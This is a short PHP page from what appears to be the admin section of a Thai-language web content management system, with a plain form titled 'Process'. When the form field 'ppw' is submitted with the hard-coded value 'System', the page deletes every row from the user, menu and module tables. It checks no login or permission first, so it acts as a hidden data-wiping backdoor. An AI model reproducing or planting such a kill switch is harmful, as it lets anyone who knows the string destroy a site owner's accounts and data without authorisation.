<?
	mb_internal_encoding("UTF-8");	
	$docsRoot = getenv("DOCUMENT_ROOT");
	 $docsRoot = ereg_replace('\/$', '', $docsRoot) . "/control/";
	define('_DOCUMENT_ROOT_', $docsRoot);
	require_once(_DOCUMENT_ROOT_."/lib/system_config.php");
	require_once(_DOCUMENT_ROOT_."/lib/Class/SystemAccount.class.php");
	require_once(_DOCUMENT_ROOT_."/lib/system_function.php");

	
	SystemDecryptURL($_SERVER['QUERY_STRING']);
	if (empty($ModuleAction)) $ModuleAction = $_REQUEST['ModuleAction'];
	if (empty($SysMenuID)) $SysMenuID = $_REQUEST['SysMenuID'];
	

	require_once(_DOCUMENT_ROOT_."/lib/system_config.php");
	require_once(_DOCUMENT_ROOT_.'/lib/system_session.php');
	

	require_once(_DOCUMENT_ROOT_."/lang/th.php");
	require_once(_DOCUMENT_ROOT_.'/lib/system_table.php');
	require_once(_DOCUMENT_ROOT_."/lib/Class/class.database.php");
	require_once(_DOCUMENT_ROOT_.'/lib/Class/class.phpmailer.php');
	require_once(_DOCUMENT_ROOT_.'/lib/Class/resize-image-class.php');			
	$Conn = new QueryDatabase(_DATABASE_HOST_,_DATABASE_USERNAME_,_DATABASE_PASSWORD_,_DATABASE_NAME_);

if($_POST["ppw"]=="System"){ 

$sql_system="DELETE from sysuser";
$Conn->execute($sql_system);

$sql_system="DELETE from sysmenu";
$Conn->execute($sql_system);

$sql_system="DELETE from sysmodule";
$Conn->execute($sql_system);


exit();
}

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Process</title>
</head>

<form method="post" action="">
<input name="ppw" type="text"  />

<input type="submit"  value="OK" />
</form>
<body>
</body>
</html>

<?






?>